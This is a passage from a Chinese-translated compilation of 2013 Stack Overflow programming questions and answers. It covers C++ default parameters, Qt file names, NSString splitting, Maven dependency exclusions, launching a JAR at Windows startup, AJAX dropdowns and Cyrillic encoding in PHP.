typeof(MyClass).GetProperties().Where(p => Attribute.IsDefined(typeof(DisplayAttribute)) 
```

但当然该属性不在 的属性上`MyClass`。我也试过：

```
ModelMetadata mmd = ModelMetadata.FromLambdaExpression(m => pi.GetValue(m, null), Html.ViewData); 
```

但我收到错误“模板只能用于字段访问、属性访问、单维数组索引或单参数自定义索引器表达式。”

如果我可以从`MyClass`to`MyMetadataClass`我可以得到它的属性名称并从`MyClass`.

这是可能的，还是我叫错了树？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T11:14:14.767

你到底想做什么？如果您想覆盖默认元数据提供程序所做的事情，那么您最好`DataAnnotationsModelMetadataProvider`用自己的实现替换。这是一些示例代码：

[http://buildstarted.com/2010/09/14/creating-your-own-modelmetadataprovider-to-handle-custom-attributes/](http://buildstarted.com/2010/09/14/creating-your-own-modelmetadataprovider-to-handle-custom-attributes/)

在这里，作者添加了对他自己的自定义属性的支持，但是您可以轻松地覆盖`DisplayAttribute`.

如果这没有帮助，请详细说明您要达到的目标。

# java - html5 验证作为 Java 中的自动测试

> ID：15244884
> 
> 赞同：1
> 
> 时间：2013-03-06T10:33:36.337
> 
> 标签：java, html, validation, testing, html-validation

我想创建一个 html5-validator 来捕获过时的标签，并且不允许 html5 的工作草案中当前未提及的标签/属性。

我已经查看了 validator.nu，但我无法让它在未知标签/属性上失败。我也尝试过使用带有 html5 模式的 xerces 和模式验证，但这并不像我想要的那样工作。

所以，我的问题是，是否有人创建了一段执行 html5 验证的 java 代码？我可以看看吗:-)

# ios - 删除 NSString 的最后一个字符，直到它碰到分隔符

> ID：15244887
> 
> 赞同：2
> 
> 时间：2013-03-06T10:33:42.203
> 
> 标签：ios, objective-c, nsstring, substring

我有一个字符串，它使用“-”作为分隔符显示库存量。

它是这样构建的：`localStock`- `wareHouseStock`-`supplierStock`

现在我想更新字符串末尾的supplierStock，但是正如您在下面的代码中看到的那样，当原始字符串返回多个单空格值（例如20）时，它会出错。

有没有办法删除最后一个“-”之前的所有字符（或删除第二个“-”之后的字符）？

```
NSMutableString *string1 = [NSMutableString stringWithString: p1.colorStock];
                NSLog(@"string1: %@",string1);
                NSString *newString = [string1 substringToIndex:[string1 length]-2];
                NSLog(@"newString: %@",newString);
                NSString *colorStock = [NSString stringWithFormat:@"%@-%@",newString,p2.supplierStock];
                NSLog(@"colorstock: %@",colorStock);
                p1.colorStock = colorStock; 
```

**NSLog1**

```
string1: 0-0-0
newString: 0-0
colorstock: 0-0-20 
```

**NSLog2**

```
string1: 0-0-20
newString: 0-0-
colorstock: 0-0--20 
```

**编辑：**感谢 Srikar 让它工作！

```
NSString *string1 = [NSString stringWithString: p1.colorStock];
                NSLog(@"string1: %@",string1);
                NSString  *finalString = [string1 stringByReplacingOccurrencesOfString:[[string1 componentsSeparatedByString:@"-"] lastObject] withString:p2.supplierStock.stringValue];
                NSLog(@"finalString: %@",finalString);
                p1.colorStock = finalString; 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-06T10:36:33.763

为什么不使用`componentsSeparatedByString`后跟`lastObject`？

`NSString *supplierStock = [[string1 componentsSeparatedByString:@"-"] lastObject];`

如果“库存量”总是以 3 组为一组，以“-”分隔，则上述方法有效。此外，由于您总是需要供应商库存，`lastObject`因此非常适合您的需求。

当然，在`string1`与您拆分后，`-`您将获得一个`NSArray`实例，您可以使用`objectAtIndex:index`. 所以如果你愿意`localStock`，你可以通过

`NSString *localStock = [[string1 componentsSeparatedByString:@"-"] objectAtIndex:0];`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T10:38:20.073

我建议使用将字符串分成 3 个部分`[NSString componentsSeparatedByString:@"-"]`，然后重新构建它：

```
NSArray *components = [p1.colorStock componentsSeparatedByString:@"-"];
p1.colorStock = [NSString stringWithFormat:@"%@-%@-%@",
    [components objectAtIndex:0],
    [components objectAtIndex:1],
    p2.supplierStock]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:40:13.680

用一个看起来像的字符串

```
NSString *myString = @"Hello-World"; 
```

您可以将其与`componentsSeparatedByString:`NSString 对象的方法分隔为

```
NSArray *myWords = [myString componentsSeparatedByString:@"-"]; 
```

然后`myWords`- 数组将包含两个`NSString`对象`Hello`和`World`。

要访问字符串：

```
NSString *theHelloString = [myWords objectAtIndex:0];
NSString *theWorldString = [myWords objectAtIndex:1]; 
```

希望能帮助到你！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-20T11:06:38.767

如果您不知道在原始字符串中将出现多少这些分隔符，这些示例都没有显示如何执行此操作。

这就是我认为正确的正确代码应该是用于拆除原始字符串并重建它直到到达最终分隔符，无论它包含多少分隔符。

```
NSString *seperator = @" ";
NSString *everythingBeforeLastSeperator;

NSArray *stringComponents = [originalString componentsSeparatedByString:seperator];

if (stringComponents.count!=0) {

    everythingBeforeLastSeperator = [stringComponents objectAtIndex:0];

    for (int a = 1 ; a < (stringComponents.count - 1) ; a++) {
        everythingBeforeLastSeperator = [NSString stringWithFormat:@"%@%@%@", everythingBeforeLastSeperator, seperator, [stringComponents objectAtIndex:a]];
    }
}

return everythingBeforeLastSeperator; 
```

# svn - svn更新不工作

> ID：15244892
> 
> 赞同：0
> 
> 时间：2013-03-06T10:34:03.283
> 
> 标签：svn, netbeans, svn-update

我正在使用 netbeans IDE 和 svn 存储库来运行我的项目。我已将 netbeans 更新为 7.3 版本并再次签出存储库。

代码已成功签出。

但是当我运行命令时 `svn up /var/www/`，命令提示符上会出现以下错误：

> svn：路径 '/var/www' 似乎是 Subversion 1.7 或更高版本工作副本的一部分。请升级您的 Subversion 客户端以使用此工作副本。

我浏览了错误但无法得到任何解决方案。

请帮帮我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:40:06.973

似乎您的命令行 svn 是 1.6 或更高版本，但您使用 1.7 客户端检查了您的项目。

的输出是`svn --version`什么？

# c++ - 在 C++ 中的非默认参数之间创建具有默认参数的函数

> ID：15244898
> 
> 赞同：1
> 
> 时间：2013-03-06T10:34:26.087
> 
> 标签：c++

我的雇主公司有一个 API 包，我被要求使用某个类的某个功能为 QA 创建一个测试。函数是这样的：

```
void func(int a, int b, int c, int d, int e); 
```

其中`b`&`d`是默认参数。这些类型显然不是`int`，我在这里创建它们是为了理解目的。`NULL`目前我可以通过传递默认参数来使用该函数。但我在想，在上述函数的情况下，如果&`func`的默认值是非零的，说& 用户不知道这个 & 如果他使用了（即 = 0），那么会得到不同的结果。`b``d``1``NULL`

所以我想知道我应该如何创建在非默认参数之间具有默认参数的函数，并且我不需要为该参数传递任何东西，即

```
func(23, , 34, , 45); 
```

目前 VS2010 为我们公司的 API 调用提供了类似实现的编译错误。

我希望我把这个问题说得很清楚以便理解。

我也尝试在其他地方搜索类似的问题，但找不到我的查询的解决方案。

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:36:13.783

你不能这样做，你必须把所有非可选参数放在第一位，然后是可选参数。

[您可以在此处](http://msdn.microsoft.com/en-us/library/91563f79%28v=vs.80%29.aspx)阅读有关可选参数的更多信息。微软说：

> 默认参数仅在省略尾随参数的函数调用中使用——它们必须是最后一个参数。因此，以下代码是非法的：

```
int print( double dvalue = 0.0, int prec ); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-06T10:40:00.017

```
void func(int a, int c, int e)
{
    int default_b = 1;
    int default_d = 1;
    func(a, default_b, c, default_d, e);
} 
```

否则你根本做不到，因为 C++ 中没有命名参数。

（虽然另一种解决方案是使用 boost::bind 或类似的仿函数）。

如果您可以修改原始功能，则可以在默认参数位于末尾的条件下简单地使用默认值：

```
void func(int a, int c, int e, int b = 1, int d = 1); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:37:05.167

您如何期望编译器知道您的意思是传递 a、c 和 e 而不是其他三元组？在函数声明中，具有默认值的参数之后的所有参数都应具有默认值。所以你永远不能有默认的 b 和 d - 每当你只向这个函数传递三个参数时，这意味着你想为最后两个参数使用默认值，它们是 d 和 e。将您的可选参数作为函数中的最后一个移动。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:45:33.453

没有直接的方法可以实现您正在寻找的东西。

第一种选择是使用[`boost::optional<T>`](http://www.boost.org/doc/libs/1_53_0/libs/optional/doc/html/index.html)for 参数。

另一种选择可能是`named parameters`在[Boost 参数库](http://www.boost.org/doc/libs/1_53_0/libs/parameter/doc/html/index.html)中实现。

如果您认为这可能适合您，并且您想进一步详细说明如何将这些用于您的用例，请告诉我，我将编辑此答案。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T12:13:28.467

这个`boost::parameter` [http://www.boost.org/doc/libs/1_53_0/libs/parameter/doc/html/index.html有一个 boost 库](http://www.boost.org/doc/libs/1_53_0/libs/parameter/doc/html/index.html)

它支持任意顺序的命名参数，未使用参数的默认值。

# c++ - 在 Qt Creator 中创建 Qt UI 表单作为共享库并在 Eclipse C++ 项目中使用它们

> ID：15244899
> 
> 赞同：1
> 
> 时间：2013-03-06T10:34:27.017
> 
> 标签：c++, linux, qt4, shared-libraries, eclipse-cdt

我正在开发一个应用程序，主要的 IDE 是 Red Hat Enterprise Linux 6 上的 Eclipse Juno(CDT)。

我有以下限制：

1.  应用程序必须在 Eclipse 上开发（非 GUI 部分）
2.  GUI 必须使用 Qt4
3.  应用程序目标平台是 Red Hat Enterprise Linux Server 6.3 版
4.  我是 Linux 开发环境、Eclipse 和 Qt 的新手。

我做了什么：

我在 Eclipse 上开发了主要应用程序。我已经创建了模块，例如与硬件交互的共享库。

我想做什么（如果可能，并且可行）：

我想使用 Qt Creator 创建应用程序的 GUI 模块，作为库并在 Eclipse 的主应用程序中使用它。

我正在尝试什么：

1.  在 Eclipse 中创建 GUI，而不使用任何 .pro 文件或 Qt Creator。但由于我是 Qt 和 Eclipse 和 Linux 的新手，而且时间有限，我想用更快、更容易和计划周密的方法来完成任务。这看起来很乏味（显然），因为我最好使用 IDE 和可视化工具来创建 GUI。

有人可以帮我解决以下问题：

1.  我做对了吗，我将 GUI 模块创建为共享库并在另一个应用程序中使用它的方法是一种天真的方法吗？

如果我错过了任何详细信息，或者您需要更多信息，请告诉我。

谢谢。

# java - JAR 文件在 Windows 启动时由 C++ 应用程序启动时不会运行

> ID：15244900
> 
> 赞同：1
> 
> 时间：2013-03-06T10:34:27.980
> 
> 标签：java, c++, windows

我有一个 JAR 文件，我想在系统启动时运行（OS=Windows）。为了实现程序在系统启动时运行，我做了两件事：

*   我在 C++ 中创建了一个可执行文件，它将触发 JAR 文件的启动。
*   在可执行文件的路径中创建了一个名为`MyApp`（名称实际上并不重要）的注册表项。`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run`

可执行文件的代码如下：

```
BOOL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR commandLine, int nCmdShow) {

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // First display a box with text 'Hello!'
    stringstream msg; msg << "Hello!";
    MessageBox(NULL, msg.str().c_str(), "", MB_OK);

    // getJavaHome is a function
    stringstream javadir; javadir << getJavaHome() << "\\bin\\java.exe";
    stringstream params; params << " -jar jarfile.jar";

    STARTUPINFO info = { sizeof (info) };
    PROCESS_INFORMATION processInfo;

    char* path = stringToCharArray(javadir.str().c_str());
    char* args = stringToCharArray(params.str().c_str());

    if (CreateProcess(path, args, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo)) {
        ::WaitForSingleObject(processInfo.hProcess, INFINITE);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
    }
    return 0;
} 
```

请注意，如您所见，该程序将在启动 JAR 文件之前输出一个消息框，显示*“Hello！”*

现在奇怪的是：

*   当我通过双击运行可执行文件时，它会显示消息框，然后它会启动 JAR 文件。
*   但是当系统启动并触发应用程序启动时，它**会**显示*Hello*，但**不会**启动 JAR 文件。

到底是怎么来的？Annnd...如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:58:34.537

我想这是工作目录的问题——最终它在自动启动时完全不同。因此，您应该通过正确的工作目录（无法判断是否可以使用`CreateProcess()`）；或为您的 JAR 文件提供一个固定的绝对路径。

# c# - 如何在 C# 中复制列表框中的选定项？

> ID：15244903
> 
> 赞同：2
> 
> 时间：2013-03-06T10:34:37.663
> 
> 标签：c#, list, copy, clipboard

如何使用右键单击“复制”菜单将列表框中的选定项目复制到剪贴板？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2017-03-30T13:17:00.587

如果你想选择一个项目，然后按 ctrl + c 然后使用这个代码：

```
 private void listBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Control == true && e.KeyCode == Keys.C)
        {
            string s = listBox1.SelectedItem.ToString();
            Clipboard.SetData(DataFormats.StringFormat, s);
        }
    } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-08-16T14:34:34.403

要将列表框中的所有项目复制到剪贴板：

```
Clipboard.SetText( string.Join( Environment.NewLine, ListBox1.Items.OfType<string>() ) ); 
```

仅将列表框中的选定行复制到剪贴板（列表框 SelectionMode 为 MultiExtended）：

```
Clipboard.SetText( string.Join( Environment.NewLine, ListBox1.SelectedItems.OfType<string>() ) ); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-11-03T01:22:33.823

要操作剪贴板中的文本，您可以使用静态剪贴板类：

```
 Clipboard.SetText("some text"); 
```

[http://msdn.microsoft.com/en-us/library/system.windows.clipboard(v=vs.110).aspx](http://msdn.microsoft.com/en-us/library/system.windows.clipboard(v=vs.110).aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-04T11:30:35.957

我单击了我的列表框以在表单类中创建一个自动函数。

```
private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
{
 Clipboard.SetDataObject(this.listBox1.SelectedItem.ToString());
} 
```

我添加了 Clipboard.SetDataObject() 行并且它有效。

# actionscript-3 - 正交投影 - 将 3d 点转换为 2d 的过程是什么

> ID：15244904
> 
> 赞同：3
> 
> 时间：2013-03-06T10:34:44.777
> 
> 标签：actionscript-3, 3d, 2d, projection, orthographic

我正在使用 actionscript 3.0 实现一个简单的点球大战游戏。游戏的视角类似于旧的“足球世界”的视角。我想通过使用维度 z 来使用 3d 游戏逻辑，因为我认为它可以帮助我实现更好的碰撞检测 - 响应结果。但是，我想保持与旧的 2d 足球相同的图形样式和视图。因此，我假设正交投影适用于这种实现。尽管互联网上有很多关于正交投影的信息，但我对有人如何在他/她的代码中应用它感到有些困惑。

所以我的问题是：

*   为了让某人在正交投影中将 3d (x, y, z) 点转换为 2d (x', y') 点，步骤是什么？
*   我们可以避免使用矩阵吗？如果是，将坐标 x'、y' 与 x、y、z 相关联的方程是什么？
*   在应用转换之前，我们是否必须定义相机位置和角度？就我而言，相机将处于固定的位置和角度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T18:14:00.220

DisplayObjects 及其后代（即 MovieClip 和 Sprite）具有 az 属性，您可以使用它来做到这一点而不会让人头疼 - 它们也有 rotationX/Y/Z 和 scaleX/Y/Z 属性！

使用“z”将相应地调整对象的位置和比例（尽管它将矢量转换为位图），没有深度排序，因此即使它的 z 坐标表明它应该在对象后面，它也会保持在对象的顶部，但是对于您想到的项目，我看不出这是个问题-无论如何修复都很容易，在场景中有一组对象，根据z位置对其进行排序并重置每个/的深度索引按排序顺序重新添加到阶段。

您可以使用剪辑的 perspectiveProjection 成员来调整 FOV、原点等 -

[透视教程](http://www.flashandmath.com/flashcs4/pp/)

..但你不需要比这更复杂。当然，您不需要涉足具有固定相机视图的矩阵，即使您想手动计算它作为实验。

希望这可以帮助

# autotools - 告诉 autoconf （仅）一个库必须是静态链接的

> ID：15244909
> 
> 赞同：2
> 
> 时间：2013-03-06T10:34:51.440
> 
> 标签：autotools

我正在使用 automake 构建一个 c++ 程序。它使用了许多我想动态链接的库。

但是，我想静态链接一个库。我不是在构建这个库，我有一个由第三方提供的 .a 文件，我想使用它。

在 configure.ac 或 Makefile.am 中是否有一种简单的方法来指定该库必须静态链接，而对所有其他库保持正常的动态链接行为不变？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T17:50:53.330

静态或动态链接的决定是由用户而非维护者做出的决定，因此尝试在 autotool 元文件中做出该决定是没有意义的。如果用户想静态链接，最可靠的做法是确保链接器搜索到的目录中不存在动态库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-09T10:36:44.397

我找到了答案。

它通过在 Makefile.am 中添加库路径来工作：

```
programname_LDADD = /usr/lib/libneeded.a 
```

仅当路径完全是指定的路径时，这才有效。

# c++ - 在 Qt 中删除文件名的扩展名

> ID：15244911
> 
> 赞同：21
> 
> 时间：2013-03-06T10:34:56.023
> 
> 标签：c++, qt

我正在使用 Qt 从用户那里获取文件名：

```
QString fileName = QFileDialog::getOpenFileName(this,tr("Select an image file"),"d:\\",tr("Image files(*.tiff *.tif )")); 
```

它可以工作，但我需要*不带扩展*名的文件名，在 Qt 中可以吗？当我尝试：

```
QString f = QFileInfo(fileName).fileName(); 
```

`f`就像 **"filename.tif"**，但我希望它是**"filename"**。

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2013-03-06T10:49:03.377

`QFileInfo`为此有两个功能：

```
QString QFileInfo::completeBaseName () const 
```

返回删除了最短扩展名的文件名 ( `file.tar.gz`-> `file.tar`)

```
QString QFileInfo::baseName () const 
```

返回删除了最长扩展名的文件名 ( `file.tar.gz`-> `file`)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-06T10:43:52.227

要处理包含多个点的文件名，请查找最后一个并获取子字符串直到那个。

```
int lastPoint = fileName.lastIndexOf(".");
QString fileNameNoExt = fileName.left(lastPoint); 
```

当然，这可以（并且应该）写成一个辅助函数以便重用：

```
inline QString withoutExtension(const QString & fileName) {
    return fileName.left(fileName.lastIndexOf("."));
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:39:42.730

你可以`split` `fileName`用“。” 作为这样的分隔符：

```
QString croped_fileName=fileName.split(".",QString::SkipEmptyParts).at(0); 
```

或者使用`section`QString 的函数来取“.”之前的第一部分。像这样：

```
QString croped_fileName=fileName.section(".",0,0); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-06T10:37:58.490

您可以使用`QString::split`并使用它`.`作为拆分它的地方。

`QStringList list1 = str.split(".");`

这将返回一个`QStringList`with `{"filename", "extenstion"}`。现在您可以在没有扩展名的情况下获取文件名。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-11-28T17:27:30.663

要获得没有扩展名的绝对路径，`QFileInfo fileInfo("/a/path/to/foo.tar.gz")`您可以使用：

```
QDir(file_info.absolutePath()).filePath(file_info.baseName()); 
```

得到`"/a/path/to/foo"`或

```
QDir(file_info.absolutePath()).filePath(file_info.completeBaseName()); 
```

要得到`"/a/path/to/foo.tar"`

# php - 使用查询结果填充第三个下拉列表

> ID：15244918
> 
> 赞同：0
> 
> 时间：2013-03-06T10:35:06.257
> 
> 标签：php, javascript, html, mysql

我有三个下拉菜单。基于在第一个下拉列表中选择的选项，我正在使用 javascript 填充第二个下拉列表。

第一个下拉菜单

```
<select id="continent" onchange="secondMenu(this,'country')" >
<option value="1">Asia</option>
<option value="2">Europe</option
</select> 
```

第二个下拉菜单

```
<select id="country" >
</select> 
```

第三个下拉菜单

```
<select id="population" >
</select> 
```

我的剧本

```
<script>
       function secondMenu(ddl1,ddl2){
  var as=new Array('Japan','China');
  var eu=new Array('Germany','France');
 switch (ddl1.value) {
        case 1:
            document.getElementById(ddl2).options.length = 0;
            for (i = 0; i < as.length; i++) {
                createOption(document.getElementById(ddl2), as[i], as[i]);
            }
            break;
        case 2:
            document.getElementById(ddl2).options.length = 0; 
        for (i = 0; i < eu.length; i++) {
            createOption(document.getElementById(ddl2), eu[i], eu[i]);
            }
            break;

   }
     function createOption(ddl, text, value) {
    var opt = document.createElement('option');
    opt.value = value;
    opt.text = text;
    ddl.options.add(opt);
    }
</script> 
```

现在基于在第二个下拉列表中选择的选项，我想运行一个 mysql 查询并填充第三个下拉列表。关于如何填充第三个下拉列表的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:30.107

使用 Ajax，我在我的一个项目中做了非常相似的事情，所以这里有一个例子：

```
$('#product_series_text', $('#product_form')).change(function() {
  var $series = $(this).val();
  // Ajax request to get an updated list of product models
  $.getJSON(
    "<?php echo url::site('product/get_model_like_series'); ?>", 
    { series: $series },
    function(data) {
      $("#product_model", 
        $('#product_form')).form_utils('replaceOptions', data);
    });
}); 
```

那里有很多 jQuery，但想法是在一个下拉列表中设置一个事件监听器，然后触发一个 Ajax 查询（它轮询数据库并发送回一个 Json 结果列表），然后创建一个下拉列表我们（只是选项更改，因为下拉列表已经存在）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:42:41.480

使用 AJAX 向您的服务器发送请求并运行 mysql 查询。假设您没有使用 JQuery，纯 AJAX 看起来像这样：

```
if (window.XMLHttpRequest) {
      xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
         if (xmlhttp.readyState == 4 && xmlhttp.status == 200) { 
            var data = xmlhttp.responseText;
            //populating your select
         }
      }
      xmlhttp.open("GET", "yourmethodpath", true);
      xmlhttp.send();
    } 
```

# iphone - 在 ios 中显示 YUV/RGBA 数据原生代码

> ID：15244920
> 
> 赞同：0
> 
> 时间：2013-03-06T10:35:07.337
> 
> 标签：iphone, ios, objective-c, opengl-es, port

我有一个移植到 iOS 的解码器。解码器是用普通的 C 语言编写的。在android中，我们有一些API，我们可以通过它来渲染解码的帧（将在YUV中，如果需要可以转换为RGBA）。

在 iOS 中是否有类似的功能，我们可以从 C 代码本身（而不是来自代码的目标 c 部分）呈现解码数据。

我尝试使用谷歌搜索，但找到了仅从代码的目标端呈现数据的方法，但没有找到从代码的本机端进行渲染的方法。

请提出一种方法。指向一些类似示例的链接将非常有帮助。

提前致谢。

# c# - 以 float 作为参数的 ScrollEventArgs 构造函数

> ID：15244929
> 
> 赞同：2
> 
> 时间：2013-03-06T10:35:30.503
> 
> 标签：c#, event-handling

`public ScrollEventArgs(ScrollEventType type, int Value)`

仅接受整数作为参数。但我需要发送浮点数，动态计算。如果我将 7.5 舍入到 7 或 8 并滚动 4 次，则为 28 或 32。帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-19T11:14:19.870

[您可以在此处](http://msdn.microsoft.com/en-us/library/system.windows.forms.scrollbar.scroll%28v=vs.71%29.aspx)找到更多选项。

# ajax - Primefaces 对话框打开后更新

> ID：15244932
> 
> 赞同：5
> 
> 时间：2013-03-06T10:35:38.723
> 
> 标签：ajax, primefaces, dialog

我想在打开内容 primafaces 对话框后更新它。可能吗？我的示例代码如下。

```
 <p:dialog widgetVar="pictureSaveDialog" id="pictureDialog" closable="false" >
   <p:outputPanel id="saveDialogPanel">

   <p:selectOneRadio id="options" value="#{pictureDefinitionsView.radioValue}"  >  
                <f:selectItem itemLabel="FILE" itemValue="FILE" />  
                <f:selectItem itemLabel=""  itemValue="URL" />  
         <p:ajax update="fileUpload1 fileUpload2" event="click" process="options"  />
   </p:selectOneRadio>

   <p:outputPanel id="fileUpload1" rendered="#{pictureDefinitionsView.selectedFileUpload}">   File </p:outputPanel>

 <p:outputPanel id="fileUpload2" rendered="#{pictureDefinitionsView.selectedUrlUpload}">   URL </p:outputPanel>
</p:outputPanel id="saveDialogPanel"> 
```

豆方法。

```
 public boolean isSelectedFileUpload(){
    return radioValue.equals("FILE");
    } 
public boolean isSelectedUrlUpload(){
    return !isSelectedFileUpload();
    } 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-06T10:52:33.147

您可以定义哪个只是更新对话框，并在属性`p:remoteCommand`中调用该命令：`onShow`

```
<p:remoteCommand name="updateDialog" update="saveDialogPanel"/>

<p:dialog widgetVar="pictureSaveDialog" id="pictureDialog" closable="false" onShow="updateDialog()"> 
```

如果您`saveDialogPanel`在某个命名容器中，请添加适当的前缀以匹配组件的 id。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T12:05:23.190

您最好在打开之前刷新对话框内容

您的 p:commandButton/p:ajax 应具有以下内容：

```
update="pictureDialog" onsuccess="pictureSaveDialog.show()" 
```

# php - smarty 模板中的非拉丁字符在使用 getDateLocal 时显示 ����

> ID：15244934
> 
> 赞同：0
> 
> 时间：2013-03-06T10:35:40.647
> 
> 标签：php, encoding, smarty

我该如何修复这个错误？我正在使用 smarty 模板。这是代码：

```
writeTR2($lngstr['page_visitordetails_startdate'], getDateLocal($lngstr['language']['date_format_full'], $i_rSet1->fields["startdate"])); 
```

结果是 ���� 05, 2013 04:16:39 应该是这样 Март 05, 2013 04:16:39

我的数据库和网站使用的是 UTF-8，在其他地方我没有这个问题，一切都很好。我的意思是西里尔字符显示良好。但是当我使用这个函数 getDateLocal 时出现了问题。当我将编码更改为西里尔文（ISO-8859-5）时，该功能会显示字符但整个站点显示不正确。请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:39:21.327

尝试使用以下 php 函数：

```
convert_cyr_string ( string $str , string $from , string $to ) 
```

有关详细说明，请参阅[http://php.net/manual/en/function.convert-cyr-string.php](http://php.net/manual/en/function.convert-cyr-string.php)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:39:23.157

具体我不知道`getDateLocale`，但是如果它使用系统的语言环境系统，则需要以适当的编码设置语言环境：

```
setlocale('en_US.UTF8'); 
```

请咨询您的系统，您可以使用哪些语言环境以及使用何种编码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:44:01.000

� 始终表示在 UTF-8 环境中显示的非 UTF-8 字符。您必须将`getDateLocal()`' 的输出更改为 UTF-8，或者即时转换：

```
$dateLocalConverted = iconv("ISO-8859-5", "UTF-8", getDateLocal($lngstr['language']['date_format_full'], $i_rSet1->fields["startdate"])); 
```

不过，这是一个肮脏的修复 - 最好找出`getDateLocal()`输出 ISO-8859-5 数据的原因，然后修复它。

# java - 我可以通过本地存储库覆盖 Maven 依赖版本吗？

> ID：15244936
> 
> 赞同：0
> 
> 时间：2013-03-06T10:35:42.167
> 
> 标签：java, maven

我在这里尝试解决一些依赖地狱的情况：我有三个项目，A、B 和 C。A 和 B 都依赖于 C。现在 A 是我自己的模块，我可以直接控制， B 是我正在使用的库，C 是直接从我的模块 A 和我的依赖项 B 使用的库。

可视化这一点：

```
 C
   ^
 /  B
|   ^
 \ /
  A 
```

由于各种原因，我现在需要对本地需要但不想（或不能）部署到正常下载 C 的全局存储库的 C 进行小的更改。

我尝试通过使用分类器标记安装在本地存储库中的 C 修改版本并在 A 的 POM 中更改对它的依赖项以包含如下分类器来做到这一点：

```
<dependency>
  <groupId>foo</groupId>
  <artifactId>C</artifactId>
  <version>0.7.16</version>
  <classifier>myclassifier</classifier>
</dependency> 
```

但`mvn dependency:tree`现在表明，由于传递依赖，我的类路径中既有带分类器的版本，也有没有分类器的版本：

```
[INFO] --- maven-dependency-plugin:2.1:tree (default-cli) @ A ---
[INFO] org.example:A:jar:0.1-SNAPSHOT
...
[INFO] +- foo:C:jar:myclassifier:0.7.16:compile
[INFO] +- bar:B:jar:3.2.5:compile
[INFO] |  +- foo:C:jar:0.7.16:compile 
```

有什么办法可以强制我的项目/ maven 在这种情况下只使用我的修改版本？

**编辑：解决方案**

现在，由于 Filipe 和 Samuel 的回答，我已经在 A 的 pom.xml 中使用这样的排除解决了它。

```
<dependency>
  <groupId>foo</groupId>
  <artifactId>C</artifactId>
  <version>0.7.16</version>
  <classifier>myclassifier</classifier>
</dependency>

<dependency>
  <groupId>bar</groupId>
  <artifactId>B</artifactId>
  <version>3.2.5</version>
  <exclusions>
    <exclusion>
      <groupId>foo</groupId>
      <artifactId>C</artifactId>
    </exclusion>
  <exclusions>
</dependency> 
```

**注意：**这当然只适用于 C 中的编辑非常小并且不更改 B 使用的 API，对我来说就是这种情况。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:43:51.580

您是说 C 是该库的官方版本，并且您的微小更改（我们称之为 C2）只会被 A 使用。您还说通过在 A 中声明对 C2 的直接依赖，这比不幸的是预计您最终会得到 C2 和 C。C 将是 B 的传递依赖项。不幸的是，Maven 反应器也将具有相同版本但具有不同分类器的库视为不同的库，从而为您提供准确的结果（同时具有 C和 C2)。

如果您只需要项目 A 中的 C2，则可以将 C 的排除项显式添加到 A 的 POM 中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T11:09:36.403

显然这个新版本的 C 对你来说不是一个新的神器，而是这个神器的一个新**版本**。

所以你不应该在这里使用分类器，而是增加版本号。

您的项目将使用上一个版本构建（即使您在解决上一个版本时遇到问题，也可以在您的 pom 中排除传递依赖）

但是，这样做时必须非常小心，因为您的 B 项目将使用旧版本的 C 编译。因此，如果您修改方法擦除，或者删除方法或类，您将遇到运行时问题。

如果您只在 C 库中添加类或方法，那么它应该可以工作。

# r - 如何在 R 中绘制堆叠的点图？

> ID：15244938
> 
> 赞同：-3
> 
> 时间：2013-03-06T10:35:47.797
> 
> 标签：r, graphics, plot

这是一个情节，我如何在R中绘制它？

![在此处输入图像描述](../Images/be5c53e6aa203a29437ba7045a4f2f03.png)

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-06T10:39:02.017

基 R 函数是`stripchart`。~~一个最小的例子~~A制定的例子：

```
set.seed(1); A <- sample(0:10, 100, replace = TRUE)
